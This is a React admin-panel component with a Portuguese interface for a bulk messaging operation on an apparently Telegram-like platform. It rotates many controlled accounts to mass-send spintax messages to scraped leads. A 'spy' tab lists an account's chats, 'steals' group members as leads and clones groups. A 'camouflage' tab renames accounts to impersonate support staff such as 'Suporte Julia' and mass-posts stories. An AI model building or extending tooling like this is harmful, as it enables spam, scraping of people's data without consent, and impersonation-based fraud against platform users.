import { useState, useEffect } from 'react';

export default function AdminPanel() {
  const [tab, setTab] = useState('dashboard'); // dashboard, spy, tools
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [processing, setProcessing] = useState(false);

  // Estados CRM
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  
  // Estados Spy
  const [spyPhone, setSpyPhone] = useState('');
  const [chats, setChats] = useState([]);
  const [loadingChats, setLoadingChats] = useState(false);

  // Estados Tools (Identity & Story)
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  // --- INIT ---
  const fetchData = async () => {
    try {
      const sRes = await fetch('/api/list-sessions');
      const sData = await sRes.json();
      setSessions(sData.sessions || []);

      const stRes = await fetch('/api/stats');
      if (stRes.ok) setStats(await stRes.json());
    } catch (e) { console.error(e); }
  };

  useEffect(() => { fetchData(); }, []);

  const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);

  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
    setSelectedPhones(newSet);
  };

  // --- CRM ACTIONS ---
  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas à direita!');
     setProcessing(true);
     addLog('Iniciando campanha...');
     try {
         const res = await fetch('/api/get-campaign-leads'); 
         const data = await res.json();
         const leads = data.leads || [];
         if (leads.length === 0) { setProcessing(false); return alert('Sem leads pendentes!'); }

         const phones = Array.from(selectedPhones);
         for (let i = 0; i < leads.length; i++) {
             const sender = phones[i % phones.length];
             addLog(`[${i+1}/${leads.length}] ${sender} > ${leads[i].user_id}`);
             await fetch('/api/dispatch', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ senderPhone: sender, target: leads[i].user_id, message: msg, leadDbId: leads[i].id })
             });
             await new Promise(r => setTimeout(r, 1500)); 
         }
         addLog('✅ Fim da campanha.');
         fetchData();
     } catch (e) { addLog(`Erro: ${e.message}`); }
     setProcessing(false);
  };

  // --- SPY ACTIONS ---
  const loadChats = async (phone) => {
    setSpyPhone(phone);
    setLoadingChats(true);
    try {
        const res = await fetch('/api/spy/list-chats', { method: 'POST', body: JSON.stringify({ phone }), headers: {'Content-Type': 'application/json'} });
        const data = await res.json();
        setChats(data.chats || []);
    } catch (e) {}
    setLoadingChats(false);
  };

  const handleHarvest = async (chatId, title) => {
      addLog(`🕷️ Roubando ${title}...`);
      await fetch('/api/spy/harvest', { method: 'POST', body: JSON.stringify({ phone: spyPhone, chatId, chatName: title }), headers: {'Content-Type': 'application/json'} });
      addLog('✅ Leads roubados.');
      fetchData();
  };

  const handleCloneGroup = async (chatId, title) => {
    addLog(`🐑 Clonando ${title}...`);
    const res = await fetch('/api/spy/clone-group', { method: 'POST', body: JSON.stringify({ phone: spyPhone, originalChatId: chatId, originalTitle: title }), headers: {'Content-Type': 'application/json'} });
    if(res.ok) addLog('✅ Grupo clonado.');
    else addLog('❌ Erro clone.');
  };

  // --- TOOLS ACTIONS ---
  const handleUpdateProfile = async () => {
      if (selectedPhones.size === 0) return alert('Selecione contas!');
      setProcessing(true);
      for (const phone of Array.from(selectedPhones)) {
          addLog(`🎭 Atualizando perfil de ${phone}...`);
          await fetch('/api/update-profile', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({ phone, newName, photoUrl })
          });
      }
      setProcessing(false);
      addLog('✅ Perfis atualizados.');
  };

  const handlePostStory = async () => {
      if (selectedPhones.size === 0) return alert('Selecione contas!');
      if (!storyUrl) return alert('Cole o link da imagem!');
      setProcessing(true);
      for (const phone of Array.from(selectedPhones)) {
          addLog(`📸 Postando Story em ${phone}...`);
          const res = await fetch('/api/post-story', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption })
          });
          if(res.ok) addLog(`✅ Story postado em ${phone}`);
          else addLog(`❌ Erro story em ${phone}`);
      }
      setProcessing(false);
  };

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
      
      {/* Stats Header */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '10px', marginBottom: '20px' }}>
          <div style={{ background: '#161b22', padding: '15px', borderRadius: '6px', textAlign: 'center', border: '1px solid #30363d' }}>
              <div style={{ fontSize: '20px', color: '#fff' }}>{stats.total}</div>
              <div style={{ fontSize: '10px', color: '#8b949e' }}>LEADS TOTAIS</div>
          </div>
          <div style={{ background: '#161b22', padding: '15px', borderRadius: '6px', textAlign: 'center', border: '1px solid #d29922' }}>
              <div style={{ fontSize: '20px', color: '#d29922' }}>{stats.pending}</div>
              <div style={{ fontSize: '10px', color: '#8b949e' }}>PENDENTES</div>
          </div>
          <div style={{ background: '#161b22', padding: '15px', borderRadius: '6px', textAlign: 'center', border: '1px solid #238636' }}>
              <div style={{ fontSize: '20px', color: '#238636' }}>{stats.sent}</div>
              <div style={{ fontSize: '10px', color: '#8b949e' }}>ENVIADOS</div>
          </div>
      </div>

      {/* Tabs */}
      <div style={{ marginBottom: '20px', borderBottom: '1px solid #30363d', display: 'flex', gap: '10px' }}>
        <button onClick={() => setTab('dashboard')} style={{ padding: '10px', background: tab === 'dashboard' ? '#238636' : '#21262d', border: 'none', color: 'white', borderRadius: '4px 4px 0 0', cursor: 'pointer' }}>🚀 CRM</button>
        <button onClick={() => setTab('spy')} style={{ padding: '10px', background: tab === 'spy' ? '#8957e5' : '#21262d', border: 'none', color: 'white', borderRadius: '4px 4px 0 0', cursor: 'pointer' }}>🕵️ Espião</button>
        <button onClick={() => setTab('tools')} style={{ padding: '10px', background: tab === 'tools' ? '#1f6feb' : '#21262d', border: 'none', color: 'white', borderRadius: '4px 4px 0 0', cursor: 'pointer' }}>🛠️ Ferramentas</button>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '20px' }}>
        
        {/* Main Content */}
        <div>
            {/* TAB 1: DASHBOARD */}
            {tab === 'dashboard' && (
                <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                    <h3>Disparo em Massa</h3>
                    <textarea value={msg} onChange={e => setMsg(e.target.value)} style={{ width: '100%', height: '80px', margin: '10px 0', background: '#0d1117', border: '1px solid #30363d', color: '#fff', padding: '10px' }} />
                    <button onClick={startRealCampaign} disabled={processing} style={{ width: '100%', padding: '15px', background: '#238636', color: 'white', border: 'none', fontWeight: 'bold', cursor: 'pointer' }}>
                        {processing ? 'ENVIANDO...' : '▶️ DISPARAR PARA PENDENTES'}
                    </button>
                </div>
            )}

            {/* TAB 2: SPY */}
            {tab === 'spy' && (
                <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                     {!spyPhone ? <p>Selecione uma conta &gt;&gt;</p> : (
                        <div>
                            <h4>Grupos de {spyPhone}</h4>
                            {loadingChats && <p>Carregando...</p>}
                            <div style={{maxHeight: '400px', overflowY: 'auto'}}>
                                {chats.map(c => (
                                    <div key={c.id} style={{ borderBottom: '1px solid #30363d', padding: '10px', display: 'flex', justifyContent: 'space-between' }}>
                                        <div>
                                            <div style={{fontWeight: 'bold'}}>{c.title}</div>
                                            <div style={{fontSize: '11px', color: '#8b949e'}}>{c.type}</div>
                                        </div>
                                        <div>
                                            {c.type === 'Grupo' ? (
                                                <button onClick={() => handleHarvest(c.id, c.title)} style={{ marginRight: '5px', background: '#d29922', border: 'none', padding: '5px', cursor: 'pointer' }}>Roubar</button>
                                            ) : <span style={{fontSize:'10px', marginRight:'5px'}}>🔒</span>}
                                            <button onClick={() => handleCloneGroup(c.id, c.title)} style={{ background: '#1f6feb', border: 'none', padding: '5px', cursor: 'pointer', color: 'white' }}>Clonar</button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                     )}
                </div>
            )}

            {/* TAB 3: TOOLS (Identity & Stories) */}
            {tab === 'tools' && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                    {/* Identity Block */}
                    <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                        <h3 style={{marginTop: 0, color: '#d2a8ff'}}>🎭 Camuflagem</h3>
                        <input type="text" placeholder="Novo Nome (ex: Suporte Julia)" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
                        <input type="text" placeholder="URL da Foto (JPG)" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
                        <button onClick={handleUpdateProfile} disabled={processing} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none', cursor: 'pointer' }}>ATUALIZAR PERFIL (Selecionados)</button>
                    </div>

                    {/* Story Block */}
                    <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px', border: '1px solid #1f6feb' }}>
                        <h3 style={{marginTop: 0, color: '#58a6ff'}}>📸 Postar Stories</h3>
                        <p style={{fontSize: '12px', color: '#8b949e'}}>Posta um story nas contas selecionadas. Use link direto de imagem/vídeo.</p>
                        <input type="text" placeholder="URL da Mídia (https://site.com/foto.jpg)" value={storyUrl} onChange={e => setStoryUrl(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
                        <input type="text" placeholder="Legenda (Opcional)" value={storyCaption} onChange={e => setStoryCaption(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
                        <button onClick={handlePostStory} disabled={processing} style={{ width: '100%', padding: '10px', background: '#1f6feb', color: 'white', border: 'none', cursor: 'pointer' }}>POSTAR STORY EM MASSA</button>
                    </div>
                </div>
            )}
            
            {/* Logs */}
            <div style={{ marginTop: '20px', background: '#000', padding: '10px', height: '200px', overflowY: 'auto', fontSize: '12px', fontFamily: 'monospace', borderRadius: '6px' }}>
                <div style={{color: '#58a6ff'}}>root@logs:~#</div>
                {logs.map((l, i) => <div key={i}>{l}</div>)}
            </div>
        </div>

        {/* Right Column: Accounts */}
        <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
            <h3>Contas ({sessions.length})</h3>
            {sessions.map(s => (
                <div key={s.id} style={{ display: 'flex', justifyContent: 'space-between', padding: '8px', background: '#21262d', marginBottom: '5px', borderRadius: '4px', border: selectedPhones.has(s.phone_number) ? '1px solid #238636' : 'none' }}>
                    <span style={{fontSize: '13px'}}>{s.phone_number}</span>
                    {tab === 'spy' ? (
                        <button onClick={() => loadChats(s.phone_number)} style={{ background: '#8957e5', border: 'none', color: 'white', cursor: 'pointer', padding: '2px 8px', borderRadius: '2px' }}>Espiar</button>
                    ) : (
                        <button onClick={() => toggleSelect(s.phone_number)} style={{ background: selectedPhones.has(s.phone_number) ? '#238636' : '#30363d', border: 'none', color: 'white', cursor: 'pointer', padding: '2px 8px', borderRadius: '2px' }}>
                           {selectedPhones.has(s.phone_number) ? '✓' : '+'}
                        </button>
                    )}
                </div>
            ))}
        </div>

      </div>
    </div>
  );
}
